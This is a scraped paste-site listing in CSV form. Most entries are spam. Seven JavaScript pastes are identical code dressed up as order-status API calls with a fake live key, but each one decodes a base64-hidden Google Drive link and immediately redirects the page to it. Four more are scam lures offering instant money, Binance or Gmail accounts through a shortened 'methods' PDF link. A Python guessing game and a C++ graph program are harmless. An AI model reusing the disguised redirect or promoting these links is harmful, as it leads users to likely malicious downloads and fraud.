id,title,username,language,date,content
4s81mN1x,Binance account CW,AlexVidoCasanelli,JavaScript,Saturday 29th of March 2025 12:54:37 PM CDT," 
Pdf https://tinyurl.com/methodssss


VecdeXSijy
"
tprzWJgk,Products.js,WassupDog45,JavaScript,Saturday 29th of March 2025 12:54:34 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/011/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
dkqkfhsd,numberguesser,gruntfutuk,Python,Saturday 29th of March 2025 12:44:16 PM CDT,""""""" simple number guessing game for beginners showing some modularisation """"""""

from random import randint
import math
from dataclasses import dataclass

# some constants
LOWEST: int = 1
HIGHEST: int = 100

AFFIRMATION: frozenset[str] = frozenset({""yes"", ""y"", ""sure"", ""yep"", ""1"", ""ok"", ""yeh"", ""yup""})
REJECTION: frozenset[str] = frozenset({""no"", ""n"", ""nah"", ""nope"", ""0""})

@dataclass
class Params:
    correct: int
    lowest: int = LOWEST
    highest: int = HIGHEST
    attempts: int = HIGHEST - LOWEST + 1

def get_num(prompt: str = ""Enter a number: "", lowest: int = LOWEST, highest: int = HIGHEST) -> int:
    """""" prompts user for and returns valid integer within range specified """"""
    valid: bool = False
    while not valid:
        response: str = input(prompt)
        try:
            num: int = int(response)
            if not (lowest <= num <= highest):
                raise ValueError
        except ValueError:
            print(f""Not valid. Expected whole number between {lowest} and {highest}"")
        else:
            valid = True
    return num

def get_guess(lowest: int, highest: int, attempts: int) -> int:  # User gives their guess
    return get_num(
        f""\nYou have {attempts} attempts.\nEnter a number between {lowest} and {highest}: "",
        lowest,
        highest
    )

def set_range() -> tuple[int, int]:  # User sets range for random number generation
    while True:
        lowest: int = get_num(""Enter minimum number: "", LOWEST, int(HIGHEST / 1.5))
        highest: int = get_num(""Enter maximum number: "", lowest, HIGHEST)
        if lowest < highest:
            return lowest, highest
        else:
            print(""Maximum number must be greater than minimum number. Try again."")

def display_difficulty(levels: dict[str, tuple[str, float]]):  # Displays difficulty levels
    print(""\nDifficulty Levels:"")
    for level in levels:
        print(f""\t{level}: {levels[level][0]}"")

def set_difficulty(levels: dict[str, tuple[str, float]]) -> int:  # User decides difficulty
    valid: bool = False
    while not valid:
        display_difficulty(levels)
        try:
            choice: int = int(input(f""Select a difficulty level (1-{len(levels)}): ""))
            if 1 <= choice <= len(levels):
                choice_str = str(choice)
                valid = True
            else:
                print(f""Invalid Selection: Try Again. Please select a number between 1 and {len(levels)}."")
        except ValueError:
            print(f""Invalid Selection: Try Again. Please select a number between 1 and {len(levels)}."")
    factor: float = levels[choice_str][1]
    return math.ceil((HIGHEST - LOWEST + 1) * factor)

def startup() -> Params:
    """""" set and return game parameters with user input """"""
    print(""\n\n\nGuessing Number Game"")
    print(""*********************"")
    lowest, highest = set_range()
    correct = randint(lowest, highest)
    attempts: int = set_difficulty(levels)
    return Params(correct, lowest, highest, attempts)

def play(params: Params) -> None:  # Loops until player wins or loses
    """""" play guessing game until player uses up all attempts and loses or guesses correctly and wins """"""
    over: bool = False
    while not over and params.attempts > 0:
        user: int = get_guess(params.lowest, params.highest, params.attempts)
        params.attempts -= 1
        if user == params.correct:
            print(f""\nYou Win! You had {params.attempts} attempts left."")
            over = True
        elif user > params.correct:
            print(""Too High!"")
        else:  # has to be user < correct
            print(""Too Low!"")
    if not over:
        print(f""\nYou Lose! The number was {params.correct}."")

def main():
    """"""Main game loop.""""""
    play_game = True
    while play_game:
        params: Params = startup()
        play(params)
        valid_input = False
        while not valid_input:
            play_again = input(""Play again? (yes/no): "").lower()
            if play_again in AFFIRMATION:
                valid_input = True
            elif play_again in REJECTION:
                play_game = False
                valid_input = True
            else:
                print(""Invalid input. Please enter yes or no."")

levels = {
    ""1"": (""Easy"", 2),
    ""2"": (""Medium"", 1),
    ""3"": (""Hard"", 0.8),
    ""4"": (""Elite"", 0.5),
    ""5"": (""Master"", 0.4),
    ""6"": (""GrandMaster"", 0.05)
}

if __name__ == ""__main__"":
    main()
"
jWz5ksW8,Order.js,WassupDog45,JavaScript,Saturday 29th of March 2025 12:39:11 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/829/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
NRkcmmQ0,EARN $900 INSTANTLY 2025 BT,AlexVidoCasanelli,JavaScript,Saturday 29th of March 2025 12:38:42 PM CDT," 
Pdf https://tinyurl.com/methodssss


e1XOqEsfrx
"
qD6TwYir,Market.js,WassupDog45,JavaScript,Saturday 29th of March 2025 12:23:48 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/752/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
gT7Utxvu,Random Gmail Acc 1A,Hitgun_Kim,JavaScript,Saturday 29th of March 2025 12:22:11 PM CDT," 
Pdf https://tinyurl.com/methodssss


9fYkukpIYv
"
zgujskVb,Untitled,WassupDog45,JavaScript,Saturday 29th of March 2025 12:08:25 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/864/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
xfqGa4Vp,Make $1000 15-MINUTES (BEGINNER) WM,Hitgun_Kim,JavaScript,Saturday 29th of March 2025 12:06:16 PM CDT," 
Pdf https://tinyurl.com/methodssss


hWqOvfwqUo
"
t0A594zB,Products.js,WassupDog45,JavaScript,Saturday 29th of March 2025 11:53:03 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/711/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
DP4GidVS,Order.js,WassupDog45,JavaScript,Saturday 29th of March 2025 11:37:40 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/390/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
NhQitCSt,Market.js,WassupDog45,JavaScript,Saturday 29th of March 2025 11:22:16 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/470/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ybjdKyWA,Untitled,Josif_tepe,C++,Saturday 29th of March 2025 11:12:50 AM CDT,"#include <iostream>
#include <vector>
#include <queue>
#include <map>
using namespace std;
typedef long long ll;
const int maxn = 1e6 + 10;

pair<int, int> idx[maxn];
int dist(int i, int j, int ci, int cj) {
    return abs(j - cj) + abs(i - ci);
}
map<int, int> mapa;
vector<pair<int, int>> graph[maxn];
int main() {
    ios_base::sync_with_stdio(false);
    int r, c;
    cin >> r >> c;
    
    vector<vector<int>> mat(r, vector<int>(c));
    int cnt = 1;
    for(int i = 0; i < r; i++) {
        for(int j = 0; j < c; j++) {
            cin >> mat[i][j];
            
            idx[cnt] = make_pair(i, j);
            cnt++;
        }
    }
    int n = r * c;
    
    for(int i = 0; i < r; i++) {
        for(int j = 0; j < c; j++) {
            graph[mat[i][j]].push_back(make_pair(mat[idx[mat[i][j]].first][idx[mat[i][j]].second], dist(i, j, idx[mat[i][j]].first, idx[mat[i][j]].second)));
        }
    }
    
    vector<bool> visited(n + 1);
    for(int i = 1; i <= n; i++) {
        if(!visited[i]) {
            
            visited[i] = true;
            queue<int> q;
            q.push(i);
            cout << i << "" "";
            ll sum = 0;
            while(!q.empty()) {
                int c = q.front();
                q.pop();
                
                
                for(int i = 0; i < (int) graph[c].size(); i++) {
                    int neighbour = graph[c][i].first;
                    int weight = graph[c][i].second;
                    
                    if(!visited[neighbour]) {
                        cout << weight << "" "" << neighbour << "" "";
                        visited[neighbour] = true;
                        q.push(neighbour);
                        
                        sum += weight;
                        mapa[neighbour] = sum;
                    }
                    
                    
                }
            }
            cout << endl;
        }
    }
    
    for(pair<int, int> m : mapa) {
        cout << m.first << "" "" << m.second << endl;
    }
    
    
    return 0;
    
}
"
WiHGmfBH,Untitled,WassupDog45,JavaScript,Saturday 29th of March 2025 11:06:52 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/133/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
